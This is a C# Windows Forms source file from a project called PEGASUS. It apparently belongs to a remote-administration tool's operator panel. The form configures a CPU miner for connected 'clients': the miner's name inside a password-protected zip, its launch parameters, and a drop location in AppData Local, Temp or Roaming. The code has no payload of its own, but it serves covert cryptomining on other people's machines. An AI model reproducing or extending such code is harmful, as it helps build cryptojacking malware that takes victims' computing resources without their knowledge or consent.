using PEGASUS.Diadyktio;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace PEGASUS.Design
{
    public partial class CPUClientSettings : Form
    {
        public bool IsOK = false;
        public string filePatchbin = "";
        private readonly List<Keys> _keysPressed;
        public PEGALISIUS F { get; set; }
        internal Clients Client { get; set; }
        internal Clients ParentClient { get; set; }
        public CPUClientSettings()
        {
            _keysPressed = new List<Keys>();
            InitializeComponent();
            metroSetButton2.Text = "Browser";
            metroSetTextBox4.Text = Properties.Settings.Default.cpu_Proc; //name of the miner in the archive without extension
            metroSetTextBox1.Text = Properties.Settings.Default.cpu_zipPassword; // Archive password
            metroSetTextBox3.Text = Properties.Settings.Default.cpu_workDir; // Launch parameters
            metroSetTextBox2.Text = Properties.Settings.Default.cpu_Parametrs; // Launch parameters


            if (Properties.Settings.Default.cpu_sysDir == "LOCAL")
                metroSetComboBox1.Text = "C:/Users/AppData/Local";

            else if (Properties.Settings.Default.cpu_sysDir == "TEMP")
                metroSetComboBox1.Text = "C:/Users/AppData/Local/Temp";

            else if (Properties.Settings.Default.cpu_sysDir == "ROAMING")
                metroSetComboBox1.Text = "C:/Users/AppData/Roaming";

            if (File.Exists(Properties.Settings.Default.cpuFile))
            {
                metroSetButton2.Text = Properties.Settings.Default.cpuFile;
                metroSetButton2.Tag = Properties.Settings.Default.cpuFile;
                IsOK = true;
            }
            else
            {
                metroSetButton2.Text = "Browser";
            }


        }


        private void metroSetButton3_Click(object sender, EventArgs e)
        {
            try
            {
                if (!File.Exists(metroSetButton2.Tag.ToString()))
                    MessageBox.Show("Miner archive not found ");
                else
                    Hide();
            }
            catch
            {

            }
        }

        private void metroSetButton1_Click(object sender, EventArgs e)
        {
            IsOK = false;
            Hide();
        }

        private void metroSetButton2_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog O = new OpenFileDialog())
            {

                O.Filter = "(*.zip)|*.zip";
                if (O.ShowDialog() == DialogResult.OK)
                {
                    filePatchbin = Path.GetFullPath(O.FileName);
                    metroSetButton2.Text = filePatchbin;
                    metroSetButton2.Tag = O.FileName;
                    IsOK = true;
                }
                else
                {
                    IsOK = true;
                }


            }
        }

        private void guna2PictureBox1_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        [DllImport("user32.DLL", EntryPoint = "ReleaseCapture")]
        private static extern void ReleaseCapture();

        [DllImport("user32.DLL", EntryPoint = "SendMessage")]
        private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

        private void guna2Panel1_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, 0x112, 0xf012, 0);
        }
    }
}
